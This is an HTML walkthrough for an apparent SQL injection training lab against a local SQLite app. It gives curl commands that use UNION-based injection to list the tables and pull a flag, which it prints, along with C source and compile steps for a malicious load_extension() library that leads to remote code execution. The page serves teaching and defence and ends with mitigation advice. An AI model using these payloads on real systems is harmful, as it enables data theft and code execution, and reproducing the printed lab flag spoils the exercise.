<h4>Part A: Practical Flag Extraction</h4>

<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=Q1"<br>
        <span class="prompt">SQL: </span>SELECT id, report_name, status FROM reports WHERE report_name LIKE '%Q1%'<br><br>
        <span class="prompt">Output:</span><br>
        id | report_name | status<br>
        1 | Q1 Financial Report | published
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report='"<br>
        <span class="prompt">Error: </span><strong>SQLite Error: unrecognized token: "&#039;"</strong>
    </div>
</div>

<h4>Step 3: Enumerate Tables via sqlite_master</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT name, sql, type FROM sqlite_master -- -"<br><br>
        <span class="prompt">Output:</span><br>
        id | report_name | status<br>
        1 | Q1 Financial Report | published<br>
        2 | Security Audit 2025 | draft<br>
        3 | Infrastructure Review | published<br>
        4 | Compliance Report | pending<br>
        <strong>master_secrets</strong> | CREATE TABLE master_secrets (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;secret_value TEXT<br>
        ) | table<br>
        reports | CREATE TABLE reports (...) | table
    </div>
</div>

<h4>Step 4: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"<br><br>
        <span class="prompt">Output:</span><br>
        id | report_name | status<br>
        1 | <strong>FLAG{sq_l04d_3xt_rc3}</strong> | pwned<br>
        1 | Q1 Financial Report | published<br>
        2 | Security Audit 2025 | draft<br>
        3 | Infrastructure Review | published<br>
        4 | Compliance Report | pending
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_l04d_3xt_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"
    </div>
</div>

<h4>Part B: Conceptual load_extension() RCE</h4>

<h4>Step 6: Test load_extension() in Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6: load_extension Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT 1, load_extension('/tmp/evil.so'), 3 -- -"<br>
        <span class="prompt">Error: </span><strong>SQLite Error: not authorized</strong><br><br>
        <span class="prompt">// load_extension() is disabled by default in PHP's SQLite3 class.</span><br>
        <span class="prompt">// It must be explicitly enabled with $conn-&gt;enableLoadExtension(true)</span>
    </div>
</div>

<h4>Step 7: How load_extension() RCE Works (Conceptual)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. RCE Attack Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// 1. Write malicious shared library (evil.c):</span><br>
        #include &lt;sqlite3ext.h&gt;<br>
        #include &lt;stdlib.h&gt;<br>
        SQLITE_EXTENSION_INIT1<br>
        int sqlite3_extension_init(sqlite3 *db, char **err,<br>
        &nbsp;&nbsp;const sqlite3_api_routines *api) {<br>
        &nbsp;&nbsp;SQLITE_EXTENSION_INIT2(api);<br>
        &nbsp;&nbsp;system("id > /tmp/pwned.txt");<br>
        &nbsp;&nbsp;return SQLITE_OK;<br>
        }<br><br>
        <span class="prompt">// 2. Compile:</span><br>
        $ gcc -shared -fPIC -o evil.so evil.c<br><br>
        <span class="prompt">// 3. Upload to target (via file upload, ATTACH DATABASE, etc.)</span><br><br>
        <span class="prompt">// 4. Trigger via SQL injection:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, load_extension('/tmp/evil.so'), 3 -- -<br><br>
        <span class="prompt">// SQLite loads the .so and runs sqlite3_extension_init() = full RCE</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>load_extension()</code> is the most dangerous SQLite function --
    it can load arbitrary native code from a shared library (.so/.dll). PHP's SQLite3 class disables
    it by default ("not authorized" error). If an attacker has a file write primitive (ATTACH DATABASE
    from Lab 7, file upload) and load_extension is enabled, this creates a full RCE chain. Always keep
    <code>$conn-&gt;enableLoadExtension(false)</code> and use parameterized queries.
</div>
